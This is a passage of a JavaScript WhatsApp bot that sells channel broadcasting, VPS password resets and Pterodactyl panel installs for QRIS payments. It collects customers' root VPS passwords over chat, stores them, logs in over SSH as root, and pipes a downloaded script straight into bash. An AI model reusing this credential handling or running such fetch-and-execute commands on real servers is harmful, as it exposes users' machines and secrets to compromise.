    Obj.harga = hargaJasa.toString();
    Obj.username = us;
    const UrlQr = global.qrisOrderKuota;
    
    const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);
    
    const teks3 = `  
*乂 INFORMASI PEMBAYARAN*  

*• ID :* ${get.data.result.transactionId}  
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}  
*• Jasa :* Share ke Channel  
*• Expired :* 5 menit  

*Note :*   
QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!  
Jika pembayaran berhasil, bot akan otomatis mengirim pesan ke channel yang telah ditentukan.  

Ketik *.batalbeli* untuk membatalkan  
`;  

    let msgQr = await conn.sendMessage(m.chat, {  
        footer: `© 2025 ${botname}`,  
        buttons: [  
            {  
                buttonId: `.batalbeli`,  
                buttonText: { displayText: 'Batalkan Pembelian' },  
                type: 1  
            }  
        ],  
        headerType: 1,  
        viewOnce: true,  
        image: {url: get.data.result.qrImageUrl},   
        caption: teks3,  
        contextInfo: {  
            mentionedJid: [m.sender]  
        },  
    });  

    db.users[m.sender].status_deposit = true;  
    db.users[m.sender].saweria = {  
        msg: msgQr,   
        chat: m.sender,  
        idDeposit: get.data.result.transactionId,   
        amount: get.data.result.amount.toString(),   
        exp: function () {  
            setTimeout(async () => {  
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
                    db.users[m.sender].status_deposit = false;  
                    await clearInterval(db.users[m.sender].saweria.exp);  
                    delete db.users[m.sender].saweria;  
                }  
            }, 300000);  
        }  
    };  

    await db.users[m.sender].saweria.exp();  

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {  
        await sleep(8000);  
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
        const req = await resultcek.data;  

        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {  
            db.users[m.sender].status_deposit = false;  
            await clearInterval(db.users[m.sender].saweria.exp);  

            await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `  
*PEMBAYARAN BERHASIL DITERIMA ✅*  

*• ID :* ${db.users[m.sender].saweria.idDeposit}  
*• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
*• Jasa :* Share ke Channel  
`}, {quoted: db.users[m.sender].saweria.msg});  

            // Mulai mengirim pesan ke channel setelah pembayaran berhasil
            const jumlahPutaran = 2; // Jumlah putaran
            const delayPerPesan = 2000; // Delay per pesan dalam milidetik (2000 ms = 2 detik)

            // Fungsi untuk menunggu delay
            const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

            // Mengirim pesan ke semua saluran dalam daftar dengan putaran
            const kirimPesan = async () => {
                for (let putaran = 0; putaran < jumlahPutaran; putaran++) {
                    for (const idSaluran of daftarSaluran) {
                        try { 
                            await conn.sendMessage(idSaluran, { text: text }); 
                            console.log(`✅ Berhasil mengirim ke ${idSaluran} (Putaran ${putaran + 1})`);
                        } catch (error) { 
                            console.error(`❌ Gagal mengirim ke ${idSaluran}:`, error); 
                        }
                        await delay(delayPerPesan); // Menunggu sebelum mengirim ke saluran berikutnya
                    }
                }
                m.reply(`✅ Selesai mengirim pesan ke semua channel dalam ${jumlahPutaran} putaran.`);
            };

            kirimPesan(); // Memulai proses pengiriman pesan
        }  
    }  
}  
break;

case 'buyjasaresetpwvps': {  
    if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan dalam private chat");  
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");  

    // Memisahkan input teks  
    let t = text.split('|');  
    if (t.length < 3) return Reply(`⚠️ *Format salah!*\nPenggunaan: ${command} ipvps|password|passwordbaru`);  

    let ipvps = t[0];  
    let passwd = t[1];  
    let pw = t[2];  

    let us = crypto.randomBytes(4).toString('hex');  
    let Obj = {};  
    Obj.harga = "10000";  
    Obj.username = us;  
    const UrlQr = global.qrisOrderKuota;  

    const amount  = Number(Obj.harga) + generateRandomNumber(110, 250);  
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);  

    const teks3 = `  
*乂 INFORMASI PEMBAYARAN*  

 *• ID :* ${get.data.result.transactionId}  
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}  
 *• Barang :* Jasa Reset Password VPS  
 *• Expired :* 5 menit  

*Note :*   
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!  
Jika pembayaran berhasil, bot akan otomatis memproses reset password VPS kamu.  

Ketik *.batalbeli* untuk membatalkan  
    `;  

    let msgQr = await conn.sendMessage(m.chat, {  
        footer: `© 2025 ${botname}`,  
        buttons: [  
            {  
                buttonId: `.batalbeli`,  
                buttonText: { displayText: 'Batalkan Pembelian' },  
                type: 1  
            }  
        ],  
        headerType: 1,  
        viewOnce: true,  
        image: { url: get.data.result.qrImageUrl },   
        caption: teks3,  
        contextInfo: { mentionedJid: [m.sender] }  
    });  

    db.users[m.sender].status_deposit = true;  
    db.users[m.sender].saweria = {  
        msg: msgQr,   
        chat: m.sender,  
        idDeposit: get.data.result.transactionId,   
        amount: get.data.result.amount.toString(),   
        ipvps, passwd, pw, // Simpan data VPS sementara  
        exp: function () {  
            setTimeout(async () => {  
                if (db.users[m.sender].status_deposit == true) {  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });  
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });  
                    db.users[m.sender].status_deposit = false;  
                    delete db.users[m.sender].saweria;  
                }  
            }, 300000);  
        }  
    };  

    await db.users[m.sender].saweria.exp();  

    while (db.users[m.sender].status_deposit == true) {  
        await sleep(8000);  
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);  
        const req = resultcek.data;  

        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {  
            db.users[m.sender].status_deposit = false;  
            await conn.sendMessage(db.users[m.sender].saweria.chat, {  
                text: `  
*PEMBAYARAN BERHASIL DITERIMA ✅*  

 *• ID :* ${db.users[m.sender].saweria.idDeposit}  
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}  
 *• Barang :* Jasa Reset Password VPS  
                `  
            }, { quoted: db.users[m.sender].saweria.msg });  

            // **Memulai proses reset password VPS**
            const connSettings = {  
                host: db.users[m.sender].saweria.ipvps,  
                port: '22',  
                username: 'root',  
                password: db.users[m.sender].saweria.passwd  
            };  

            const connCommand = `${global.bash}`;  
            const conn = new Client();  

            // Fungsi untuk mendapatkan waktu WIB  
            const getWIBTime = () => {  
                const date = new Date();  
                const options = { timeZone: 'Asia/Jakarta', hour12: false };  
                return date.toLocaleString('id-ID', options);  
            };  

            const startTime = getWIBTime();  
            Reply(`🔐 *Mengubah Password VPS Dimulai...*\n⏰ Waktu Mulai: ${startTime}`);  

            conn.on('ready', () => {  
                conn.exec(connCommand, (err, stream) => {  
                    if (err) throw err;  

                    stream.on('close', (code, signal) => {  
                        const endTime = getWIBTime();  
                        Reply(`✅ *Password VPS Berhasil Diubah!*\n\n📋 *Detail VPS:*\n- 🌐 IP VPS: ${db.users[m.sender].saweria.ipvps}\n- 🔑 Password Baru: ${db.users[m.sender].saweria.pw}\n\n⏰ *Waktu Proses:*\n- Mulai: ${startTime}\n- Selesai: ${endTime}\n\n💡 *Catatan:* Simpan data ini dengan baik. Terima kasih! ✨`);  
                        conn.end();  
                    }).on('data', (data) => {  
                        stream.write(`${global.tokeninstall}\n`);  
                        stream.write('8\n');  
                        stream.write(`${db.users[m.sender].saweria.pw}\n`);  
                        stream.write(`${db.users[m.sender].saweria.pw}\n`);  
                    }).stderr.on('data', (data) => {  
                        console.log('STDERR: ' + data);  
                    });  
                });  
            }).on('error', (err) => {  
                console.log('Connection Error: ' + err);  
                Reply('❌ *IP atau Password Salah!*');  
            }).connect(connSettings);  
        }  
    }  
}  
break;

case 'buyjasathema': {
    if (m.isGroup) return m.reply("Pembelian jasa install panel hanya bisa dilakukan melalui private chat")
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

    let t = text.split(',');
    if (t.length < 2) return Reply(`❌ *Format salah!* Penggunaan: ${prefix + command} ipvps,password`);

    let [ipvps, passwd] = t;

    let us = crypto.randomBytes(4).toString('hex');
    let Obj = { harga: "5000", username: us };
    const UrlQr = global.qrisOrderKuota;
    const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Jasa Install Thema
 *• Expired :* 5 menit

*Note:* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati batas waktu, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {
                buttonId: `.batalbeli`,
                buttonText: { displayText: 'Batalkan Pembelian' },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teks3,
        contextInfo: { mentionedJid: [m.sender] },
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = resultcek.data;
        
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await conn.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Jasa Install Thema
 `}, { quoted: db.users[m.sender].saweria.msg });

            // Tambahkan eksekusi install panel setelah pembayaran berhasil
            await conn.sendMessage(m.chat, {
                footer: `© 2025 ${botname} 🚀`,
                buttons: [
                    {
                        buttonId: 'action',
                        buttonText: { displayText: '⚙️ Pilih Tema' },
                        type: 4,
                        nativeFlowInfo: {
                            name: 'single_select',
                            paramsJson: JSON.stringify({
                                title: '🎨 Pilih Install Thema Lain',
                                sections: [
                                    {
                                        title: '📜 List Install Thema',
                                        rows: [
                                    { title: '🛠 INSTALLDEPEND', description: '⚡ Install Thema Depend', id: `.installdepend ${ipvps}|${passwd}` }, 
                                    { title: '🌟 INSTALLSTELLAR', description: '✨ Install Thema Stellar', id: `.installtemastellar ${ipvps}|${passwd}` },
                                    { title: '💰 INSTALLBILLING', description: '💵 Install Thema Billing', id: `.installtemabilling ${ipvps}|${passwd}` }, 
                                    { title: '🌀 INSTALLENIGMA', description: '🔮 Install Thema Enigma', id: `.installtemaenigma ${ipvps}|${passwd}` },
                                    { title: '🎶 INSTALLNIGHTCORE', description: '🌙 Install Thema Night Core', id: `.installtemanightcore ${ipvps}|${passwd}` },
                                    { title: '🌌 INSTALLNEBULA', description: '🌠 Install Thema Nebula', id: `.installtemanebula ${ipvps}|${passwd}` },
                                    { title: '🏛 INSTALLELYSIUM', description: '⚔️ Install Thema Elysium', id: `.installtemaelysium ${ipvps}|${passwd}` }
                                        ]
                                    }
                                ]
                            })
                        }
                    }
                ],
                headerType: 1,
                viewOnce: true,
                image: { url: global.image.reply },
                caption: "🎨 *Silakan pilih tema yang ingin di install dari 7 versi di bawah ini!* 🚀\n"
            }, { quoted: msgQr });

            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'installthema': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split('|');
    if (t.length < 2) return Reply(`❌ *Format salah!* Penggunaan: ${prefix + command} ipvps|password`);

    let ipvps = t[0];
    let passwd = t[1];

    await conn.sendMessage(m.chat, { 
        footer: `© 2025 ${botname} 🚀`, 
        buttons: [ 
            { 
                buttonId: 'action', 
                buttonText: { displayText: '⚙️ Pilih Tema' }, 
                type: 4, 
                nativeFlowInfo: { 
                    name: 'single_select', 
                    paramsJson: JSON.stringify({ 
                        title: '🎨 Pilih Install Thema Lain', 
                        sections: [ 
                            { 
                                title: '📜 List Install Thema', 
                                rows: [ 
                                    { title: '🛠 INSTALLDEPEND', description: '⚡ Install Thema Depend', id: `.installdepend ${ipvps}|${passwd}` }, 
                                    { title: '🌟 INSTALLSTELLAR', description: '✨ Install Thema Stellar', id: `.installtemastellar ${ipvps}|${passwd}` },
                                    { title: '💰 INSTALLBILLING', description: '💵 Install Thema Billing', id: `.installtemabilling ${ipvps}|${passwd}` }, 
                                    { title: '🌀 INSTALLENIGMA', description: '🔮 Install Thema Enigma', id: `.installtemaenigma ${ipvps}|${passwd}` },
                                    { title: '🎶 INSTALLNIGHTCORE', description: '🌙 Install Thema Night Core', id: `.installtemanightcore ${ipvps}|${passwd}` },
                                    { title: '🌌 INSTALLNEBULA', description: '🌠 Install Thema Nebula', id: `.installtemanebula ${ipvps}|${passwd}` },
                                    { title: '🏛 INSTALLELYSIUM', description: '⚔️ Install Thema Elysium', id: `.installtemaelysium ${ipvps}|${passwd}` }
                                ] 
                            } 
                        ] 
                    }) 
                } 
            } 
        ], 
        headerType: 1, 
        viewOnce: true, 
        image: { url: global.image.reply }, 
        caption: "🎨 *Silakan pilih tema yang ingin di-install dari 7 versi di bawah ini!* 🚀\n" 
    }, { quoted: qtext2 });

} 
break;

case 'buyjasainstall': {
    if (m.isGroup) return m.reply("Pembelian jasa install panel hanya bisa dilakukan melalui private chat")
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

    let t = text.split(',');
    if (t.length < 5) return Reply(`❌ *Format salah!* Penggunaan: ${prefix + command} ipvps,password,domainpnl,domainnode,ramvps (Contoh: 192.168.1.1,password123,example.com,node.example.com,8gb)`);

    let [ipvps, passwd, subdomain, domainnode, ramvps] = t;

    let us = crypto.randomBytes(4).toString('hex');
    let Obj = { harga: "10000", username: us };
    const UrlQr = global.qrisOrderKuota;
    const amount = Number(Obj.harga) + generateRandomNumber(110, 250);

    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Jasa Install Panel
 *• Expired :* 5 menit

*Note:* 
QRIS pembayaran hanya berlaku dalam 5 menit. Jika sudah melewati batas waktu, pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil, bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [
            {
                buttonId: `.batalbeli`,
                buttonText: { displayText: 'Batalkan Pembelian' },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teks3,
        contextInfo: { mentionedJid: [m.sender] },
    });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = resultcek.data;
        
        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await conn.sendMessage(db.users[m.sender].saweria.chat, { text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Jasa Install Panel
 `}, { quoted: db.users[m.sender].saweria.msg });

            // Tambahkan eksekusi install panel setelah pembayaran berhasil
            await conn.sendMessage(m.chat, {
                footer: `© 2025 ${botname} 🚀`,
                buttons: [
                    {
                        buttonId: 'action',
                        buttonText: { displayText: '🖥️ Pilih OS Panel' },
                        type: 4,
                        nativeFlowInfo: {
                            name: 'single_select',
                            paramsJson: JSON.stringify({
                                title: '⚙️ Pilih Install Panel',
                                sections: [
                                    {
                                        title: '📜 List Install Panel',
                                        rows: [
                                            { title: '🐧 UBUNTU 20.04', description: '🔧 Install Panel Ubuntu Versi 20.04', id: `.installpanel1 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` },
                                            { title: '🐧 UBUNTU 22.04', description: '🔧 Install Panel Ubuntu Versi 22.04', id: `.installpanel2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` },
                                            { title: '🐧 UBUNTU 24.04', description: '🔧 Install Panel Ubuntu Versi 24.04', id: `.installpanel3 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` },
                                            { title: '📀 DEBIAN 11', description: '💽 Install Panel Debian Versi 11', id: `.installpanel4 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` },
                                            { title: '📀 DEBIAN 12', description: '💽 Install Panel Debian Versi 12', id: `.installpanel5 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` }
                                        ]
                                    }
                                ]
                            })
                        }
                    }
                ],
                headerType: 1,
                viewOnce: true,
                image: { url: global.image.reply },
                caption: "🖥️ *Silakan pilih OS untuk menginstall panel dari daftar di bawah ini!* 🚀\n"
            }, { quoted: msgQr });

            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'installpanel': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split(',');
    if (t.length < 5) return Reply(`❌ *Format salah!* Penggunaan: ${prefix + command} ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);

    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];

    await conn.sendMessage(m.chat, { 
        footer: `© 2025 ${botname} 🚀`, 
        buttons: [ 
            { 
                buttonId: 'action', 
                buttonText: { displayText: '🖥️ Pilih OS Panel' }, 
                type: 4, 
                nativeFlowInfo: { 
                    name: 'single_select', 
                    paramsJson: JSON.stringify({ 
                        title: '⚙️ Pilih Install Panel', 
                        sections: [ 
                            { 
                                title: '📜 List Install Panel', 
                                rows: [ 
                                    { title: '🐧 UBUNTU 20.04', description: '🔧 Install Panel Ubuntu Versi 20.04', id: `.installpanel1 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` }, 
                                    { title: '🐧 UBUNTU 22.04', description: '🔧 Install Panel Ubuntu Versi 22.04', id: `.installpanel2 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` },
                                    { title: '🐧 UBUNTU 24.04', description: '🔧 Install Panel Ubuntu Versi 24.04', id: `.installpanel3 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` }, 
                                    { title: '📀 DEBIAN 11', description: '💽 Install Panel Debian Versi 11', id: `.installpanel4 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` },
                                    { title: '📀 DEBIAN 12', description: '💽 Install Panel Debian Versi 12', id: `.installpanel5 ${ipvps},${passwd},${subdomain},${domainnode},${ramvps}` } 
                                ] 
                            } 
                        ] 
                    }) 
                } 
            } 
        ], 
        headerType: 1, 
        viewOnce: true, 
        image: { url: global.image.reply }, 
        caption: "🖥️ *Silakan pilih OS untuk menginstall panel dari daftar di bawah ini!* 🚀\n" 
    }, { quoted: qtext2 });

} 
break;

case 'installpanel1': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split(',');
    if (t.length < 5) return Reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel1 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        Reply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        Reply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        Reply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        Reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support 々 IjulTaka || 乂🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break

case 'installpanel2': {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split(',');
    if (t.length < 5) return Reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel2 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        Reply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        Reply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
